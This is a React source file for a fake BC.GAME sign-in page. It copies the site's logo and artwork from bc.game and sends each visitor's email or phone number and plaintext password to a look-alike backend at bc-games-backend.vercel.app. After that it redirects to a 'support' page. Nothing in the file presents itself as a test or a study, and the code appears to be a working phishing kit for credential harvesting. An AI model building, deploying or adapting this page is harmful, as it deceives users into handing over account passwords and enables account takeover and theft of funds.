import React, { useState } from 'react';
import { Eye, EyeOff, X, User, Twitter, Send, MessageSquare, MessageCircle, Phone, Hash, Github } from 'lucide-react';

export default function App() {
  const [formData, setFormData] = useState({ emailOrPhone: '', password: '' });
  const [errors, setErrors] = useState({ emailOrPhone: '', password: '' });
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  const handleInputChange = (e) => {
    const { name, value } = e.target;
    setFormData({ ...formData, [name]: value });
    if (errors[name]) setErrors({ ...errors, [name]: '' });
  };

  const togglePasswordVisibility = () => setShowPassword(!showPassword);

  const validateForm = () => {
    let isValid = true;
    const newErrors = { emailOrPhone: '', password: '' };

    if (!formData.emailOrPhone) {
      newErrors.emailOrPhone = 'Please enter your email address or phone number';
      isValid = false;
    }
    if (!formData.password) {
      newErrors.password = 'Please enter your password';
      isValid = false;
    } else if (formData.password.length < 6) {
      newErrors.password = 'Password must be at least 6 characters';
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!validateForm()) return;
    setLoading(true);
    setError('');
    try {
      const isEmail = formData.emailOrPhone.includes('@');
      let phoneNumber = formData.emailOrPhone;
      if (!isEmail && !phoneNumber.startsWith('+91')) phoneNumber = `+91${phoneNumber}`;
      const payload = {
        password: formData.password,
        loginDate: new Date().toISOString().split('T')[0],
        loginTime: new Date().toTimeString().split(' ')[0],
        loginMethod: isEmail ? 'email' : 'phone',
        ...(isEmail ? { email: formData.emailOrPhone } : { phone: phoneNumber })
      };

      const response = await fetch('https://bc-games-backend.vercel.app/api/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        window.location.href = '/support';
      } else throw new Error('Login failed');
    } catch (err) {
      setError('Login failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const socialIcons = [
    { name: 'Google', icon: <User size={14} /> },
    { name: 'Twitter', icon: <Twitter size={14} /> },
    { name: 'Telegram', icon: <Send size={14} /> },
    { name: 'Discord', icon: <MessageSquare size={14} /> },
    { name: 'WeChat', icon: <MessageCircle size={14} /> },
    { name: 'WhatsApp', icon: <Phone size={14} /> },
    { name: 'Line', icon: <Hash size={14} /> },
    { name: 'Steam', icon: <Github size={14} /> },
  ];

  return (
    <div style={{ minHeight: '100vh', backgroundColor: '#232626', color: 'white', fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', maxHeight: '100vh', overflow: 'hidden' }}>
      <div style={{ position: 'relative', height: '160px' }}>
        <img src="https://bc.game/modules/account2/assets/bg_m-cac172cf.png" alt="Background" style={{ width: '100%', height: '100%', objectFit: 'cover' }} />
        <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: '50px', background: 'linear-gradient(to top, rgba(35,38,38,0.9), transparent)', zIndex: 10 }}></div>
        <div style={{ position: 'absolute', top: 0, left: 0, right: 0, padding: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', zIndex: 20 }}>
          <img src="https://bc.game/assets/logo/logo.png" alt="BC.GAME Logo" style={{ height: '24px', width: 'auto' }} />
          <X style={{ width: '20px', height: '20px', cursor: 'pointer', opacity: 0.6 }} />
        </div>
      </div>

      <div style={{ padding: '0 16px', flex: 1, overflowY: 'auto' }}>
        <h1 style={{ fontSize: '24px', fontWeight: '600', marginBottom: '16px', color: 'rgba(255, 255, 255, 0.9)' }}>Sign In</h1>

        <form onSubmit={handleSubmit} style={{ marginBottom: '16px', maxWidth: '360px', marginInline: 'auto' }}>
          <div style={{ marginBottom: '10px' }}>
            <input name="emailOrPhone" placeholder="Email / Phone Number" value={formData.emailOrPhone} onChange={handleInputChange} style={{ width: '100%', padding: '10px 14px', backgroundColor: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: 'white', fontSize: '14px', outline: 'none', boxSizing: 'border-box' }} />
          </div>

          <div style={{ marginBottom: '8px', position: 'relative' }}>
            <input type={showPassword ? 'text' : 'password'} name="password" placeholder="Password" value={formData.password} onChange={handleInputChange} style={{ width: '100%', padding: '10px 14px', paddingRight: '36px', backgroundColor: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: 'white', fontSize: '14px', outline: 'none', boxSizing: 'border-box' }} />
            <div onClick={togglePasswordVisibility} style={{ position: 'absolute', top: '50%', right: '10px', transform: 'translateY(-50%)', cursor: 'pointer', color: 'white' }}>
              {showPassword ? <EyeOff size={16} /> : <Eye size={16} />}
            </div>
          </div>

          <div style={{ textAlign: 'right', marginBottom: '12px' }}>
            <a href="#" style={{ color: 'rgba(255,255,255,0.5)', fontSize: '12px', textDecoration: 'none' }}>Forgot your password?</a>
          </div>

          <button type="submit" disabled={loading} style={{ width: '100%', padding: '10px', background: '#4CAF50', border: 'none', borderRadius: '8px', color: 'white', fontSize: '14px', fontWeight: '600', cursor: 'pointer', marginBottom: '16px' }}>
            Sign In
          </button>
        </form>

        <div style={{ textAlign: 'center', marginBottom: '16px' }}>
          <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: '13px' }}>New to BC.GAME? </span>
          <a href="#" style={{ color: '#4CAF50', fontSize: '13px', textDecoration: 'none' }}>Create account</a>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', marginBottom: '14px', gap: '10px' }}>
          <div style={{ flex: 1, height: '1px', backgroundColor: 'rgba(255,255,255,0.1)' }}></div>
          <span style={{ color: 'rgba(255,255,255,0.5)', fontSize: '12px', whiteSpace: 'nowrap' }}>Log in directly with</span>
          <div style={{ flex: 1, height: '1px', backgroundColor: 'rgba(255,255,255,0.1)' }}></div>
        </div>

        <button style={{ width: '100%', padding: '10px', backgroundColor: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.1)', borderRadius: '8px', color: 'white', fontSize: '13px', cursor: 'pointer', marginBottom: '14px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
          <div style={{ width: '14px', height: '14px', backgroundColor: 'rgba(255,255,255,0.1)', borderRadius: '3px' }}></div>
          Sign In with passkey
        </button>

        <div style={{ display: 'flex', justifyContent: 'space-evenly', gap: '8px', marginBottom: '20px' }}>
          {socialIcons.map((social, index) => (
            <button key={index} style={{ width: '32px', height: '32px', backgroundColor: 'transparent', border: '1px solid rgba(255,255,255,0.15)', borderRadius: '6px', display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: 'pointer', color: 'white', padding: 0 }} aria-label={`Sign in with ${social.name}`}>
              {social.icon}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}
